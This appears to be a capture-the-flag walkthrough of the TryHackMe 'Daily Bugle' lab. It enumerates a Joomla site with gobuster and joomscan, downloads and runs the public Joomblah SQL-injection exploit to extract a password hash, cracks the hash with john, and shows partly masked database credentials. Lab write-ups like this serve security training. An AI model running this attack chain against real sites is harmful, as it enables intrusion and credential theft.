# Daily Bugle Walkthrough -THM


![MainPage](https://github.com/gray-area/THM/blob/main/DailyBugle/Sources/DailyBugle.png "Website")

enumerate shares by using gobuster

```
gobuster dir -u http://10.10.87.111 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

![gobuster](https://github.com/gray-area/THM/blob/main/DailyBugle/Sources/gobuster.png "Website")


The administrator directory looks interesting...

![gobuster]("https://github.com/gray-area/THM/blob/main/DailyBugle/Sources/Joomla login.png" "Website")

Joomla login.

Downloaded joomscan

```
perl joomscan.pl -u http://10.10.87.111
```
![gobuster](https://github.com/gray-area/THM/blob/main/DailyBugle/Sources/Joomscan.png "Website")

Version found!

Get upgraded Joomblah script
https://github.com/XiphosResearch/exploits/blob/3950e7618b1920b3d7d34ec6f72f4c0736d010d7/Joomblah/joomblah_py3.py

```
wget https://github.com/XiphosResearch/exploits/blob/3950e7618b1920b3d7d34ec6f72f4c0736d010d7/Joomblah/joomblah_py3.py
```
```
python3 joomblah_py3.py http://10.10.172.228
```

![gobuster](https://github.com/gray-area/THM/blob/main/DailyBugle/Sources/joomlah_run.png "Website")

I created a text file with copied hash from joomblah output

```
nano hash.txt
(paste hash)
ctrl-x
y
enter
```

I then ran this against the hash pasted into hash.txt

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
User: j****
Password: s*********23
```

Found this in /var/www/html/configuration.php

```
public $user = 'root';
	public $password = 'nv***********Nu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'U***********mVC';
```




